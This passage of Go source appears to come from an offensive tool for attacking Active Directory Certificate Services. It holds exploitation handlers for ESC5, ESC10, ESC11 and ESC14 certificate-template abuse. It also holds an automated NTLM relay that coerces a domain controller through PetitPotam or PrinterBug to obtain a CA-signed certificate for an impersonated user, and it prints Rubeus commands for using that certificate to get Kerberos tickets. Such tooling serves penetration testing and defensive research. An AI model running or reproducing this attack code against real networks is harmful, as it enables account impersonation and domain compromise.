		relayCert, relayKey, relayErr := runAutomatedRelay(cfg, f.CAHostname, f.CAName, templateName, upn, listenerIP, listenerPort, relayPort, time.Duration(relayTimeout)*time.Second)
		if relayErr != nil {
			return relayErr
		}
		cert, certKey = relayCert, relayKey
	case "5":
		caName, _ := cmd.Flags().GetString("ca")
		if caName == "" {
			return fmt.Errorf("-ca is required for ESC5 exploitation")
		}
		cert, certKey, err = pki.ExploitESC5(ctx, cfg, conn, caName, upn)
	case "10":
		attackerDN, _ := cmd.Flags().GetString("adn")
		if attackerDN == "" {
			return fmt.Errorf("--adn is required for ESC10 exploitation")
		}
		cert, certKey, err = pki.ExploitESC10(ctx, cfg, conn, templateName, attackerDN, upn)
	case "11":
		esc11Findings, scanErr := pki.ScanESC11(ctx, cfg, conn)
		if scanErr != nil {
			return fmt.Errorf("ESC11 scan failed: %w", scanErr)
		}
		if len(esc11Findings) == 0 {
			return fmt.Errorf("no CAs with unencrypted RPC enrollment found (ESC11)")
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc11Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		f := esc11Findings[0]

		listenerIP, _ := cmd.Flags().GetString("lip")
		listenerPort, _ := cmd.Flags().GetInt("lp")
		if listenerIP == "" {
			return fmt.Errorf("-l (listener IP) is required for automated coercion")
		}
		relayPort, _ := cmd.Flags().GetInt("rp")
		relayTimeout, _ := cmd.Flags().GetInt("rt")

		relayCert, relayKey, relayErr := runAutomatedRelay(cfg, f.CAHostname, f.CAName, templateName, upn, listenerIP, listenerPort, relayPort, time.Duration(relayTimeout)*time.Second)
		if relayErr != nil {
			return relayErr
		}
		cert, certKey = relayCert, relayKey
	case "14":
		victimDN, _ := cmd.Flags().GetString("vdn")
		if victimDN == "" {
			return fmt.Errorf("--vdn is required for ESC14 exploitation")
		}
		cert, certKey, err = pki.ExploitESC14(ctx, cfg, conn, templateName, victimDN)
	default:
		return fmt.Errorf("unsupported ESC: %s (supported: 1-14)", exploit)
	}

	if err != nil {
		return fmt.Errorf("exploitation failed: %w", err)
	}

	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	basePath := output
	for _, ext := range []string{".pem", ".crt", ".key", ".pfx"} {
		basePath = strings.TrimSuffix(basePath, ext)
	}

	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write cert: %w", err)
	}
	pfxPath := basePath + ".pfx"
	if err := pki.WritePFX(cert, certKey, pfxPath, pfxPassword); err != nil {
		return fmt.Errorf("PFX export failed: %w", err)
	}

	if cfg.OutputJSON {
		result := pki.ExploitResult{
			Exploit:   strings.ToUpper(exploit),
			Template:  templateName,
			TargetUPN: upn,
			CertPath:  basePath + ".crt",
			KeyPath:   basePath + ".key",
			PFXPath:   basePath + ".pfx",
			Success:   true,
		}
		data, err := json.MarshalIndent(result, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	selfSigned := cert.Issuer.CommonName == cert.Subject.CommonName

	if selfSigned {
		fmt.Printf("\n[!] OFFLINE MODE — certificate is self-signed (CA enrollment failed)\n")
		fmt.Printf("    This cert will NOT authenticate against a real domain controller.\n")
		fmt.Printf("    To get a CA-signed cert, ensure the CA's web enrollment (/certsrv/) is reachable.\n")
	} else {
		fmt.Printf("\n[+] Exploitation successful — CA-signed certificate obtained!\n")
	}
	fmt.Printf("    Exploit:  ESC%s\n", escID)
	fmt.Printf("    Template: %s\n", templateName)
	fmt.Printf("    UPN:      %s\n", upn)
	fmt.Printf("    Issuer:   %s\n", cert.Issuer.CommonName)
	fmt.Printf("    Files:    %s.crt / %s.key / %s.pfx\n", basePath, basePath, basePath)
	if !selfSigned {
		sam := upn
		if idx := strings.Index(sam, "@"); idx > 0 {
			sam = sam[:idx]
		}
		fmt.Printf("\n[*] Authenticate with the certificate:\n")
		rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /ptt", sam, pfxPath)
		if pfxPassword != "" {
			rubeusCmd += fmt.Sprintf(" /password:%s", pfxPassword)
		}
		fmt.Printf("    %s\n", rubeusCmd)
		fmt.Printf("    KRB5CCNAME=admin.ccache Rubeus.exe asktgt /user:%s /certificate:%s /ptt\n", sam, pfxPath)
	}
	return nil
}

func runImportPFX(cmd *cobra.Command, pfxPath string) error {
	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	outputJSON, _ := cmd.Flags().GetBool("json")

	if outputJSON {
		info, err := pki.LoadPFXInfo(pfxPath, pfxPassword)
		if err != nil {
			return fmt.Errorf("load PFX: %w", err)
		}
		data, err := json.MarshalIndent(info, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	_, _, err := pki.LoadPFX(pfxPath, pfxPassword)
	if err != nil {
		return fmt.Errorf("load PFX: %w", err)
	}
	return nil
}

func runReport(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("-dc and -d are required for report generation")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or -H <NT_HASH> or -k for Kerberos)")
	}
	ctx := context.Background()
	conn, err := pki.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("ldap connect: %w", err)
	}
	defer conn.Close()

	reportFormat, _ := cmd.Flags().GetString("format")
	if reportFormat == "" {
		reportFormat = "markdown"
	}

	output, _ := cmd.Flags().GetString("output")
	if output == "" {
		output = "findings.md"
	}

	fmt.Printf("[*] Running full ADCS enumeration for report...\n")
	result, err := pki.EnumerateAll(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumeration failed: %w", err)
	}

	reportData, err := pki.GenerateReport(result, reportFormat)
	if err != nil {
		return fmt.Errorf("generate report: %w", err)
	}

	if err := os.WriteFile(output, reportData, 0600); err != nil {
		return fmt.Errorf("write report: %w", err)
	}

	fmt.Printf("[+] Report written to %s (%d bytes)\n", output, len(reportData))
	fmt.Printf("    Format:    %s\n", reportFormat)
	fmt.Printf("    Templates: %d\n", len(result.Templates))
	fmt.Printf("    Findings:  %d\n", result.VulnCount)
	return nil
}

func runAutomatedRelay(cfg *pki.ADCSConfig, caHostname, caName, templateName, upn, listenerIP string, listenerPort, relayPort int, relayTimeout time.Duration) (*x509.Certificate, crypto.Signer, error) {
	if relayPort == 0 {
		relayPort = 8080
	}
	if relayTimeout == 0 {
		relayTimeout = 120 * time.Second
	}

	fmt.Printf("[*] Starting native SMB NTLM relay on :%d → %s (CA: %s)\n", relayPort, caHostname, caName)

	listenerIPForCoerce := listenerIP
	if listenerIPForCoerce == "" {
		listenerIPForCoerce = "127.0.0.1"
	}

	go func() {
		time.Sleep(2 * time.Second)
		fmt.Printf("[*] Triggering coercion: %s → %s:%d\n", cfg.TargetDC, listenerIPForCoerce, listenerPort)
		if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIPForCoerce, listenerPort, pki.CoercePetitPotam, cfg); coerceErr != nil {
			fmt.Printf("[!] PetitPotam coercion failed: %v\n", coerceErr)
			if err2 := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIPForCoerce, listenerPort, pki.CoercePrinterBug, cfg); err2 != nil {
				fmt.Printf("[!] PrinterBug also failed: %v\n", err2)
			}
		}
	}()

	cert, key, err := pki.RunSMBRelay(caHostname, caName, templateName, upn, relayPort, relayTimeout)
	if err != nil {
		return nil, nil, fmt.Errorf("SMB relay failed: %w", err)
	}

	fmt.Printf("[+] Relay: Certificate obtained for %s\n", upn)
	return cert, key, nil
}


